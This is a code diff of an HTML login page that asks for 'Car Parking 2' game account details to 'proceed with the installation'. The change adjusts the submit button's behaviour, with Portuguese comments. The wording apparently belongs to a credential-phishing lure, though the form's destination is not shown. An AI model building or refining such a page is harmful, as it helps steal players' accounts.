@@ -177,20 +177,21 @@
         <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
     </div>
 
-    <script>
-        const loginForm = document.getElementById('loginForm');
-        const btnSubmit = document.getElementById('btnSubmit');
+   <script>
+    const loginForm = document.getElementById('loginForm');
+    const btnSubmit = document.getElementById('btnSubmit');
 
-        loginForm.addEventListener('submit', function() {
-            // Muda o texto do botão para indicar o carregamento
-            btnSubmit.innerText = 'CONNECTING...';
-            
-            // Aguarda 10ms para garantir o envio dos dados antes de travar o botão
-            setTimeout(() => {
-                btnSubmit.disabled = true;
-            }, 10);
-        });
-    </script>
+    // Restaura o botão se o celular recarregar a página do cache (Back/Forward)
+    window.addEventListener('pageshow', function () {
+        btnSubmit.disabled = false;
+        btnSubmit.innerText = 'ENTER';
+    });
+
+    loginForm.addEventListener('submit', function (e) {
+        // Altera apenas o texto visual para indicar o envio
+        btnSubmit.innerText = 'CONNECTING...';
+    });
+</script>
 
 </body>
 </html>
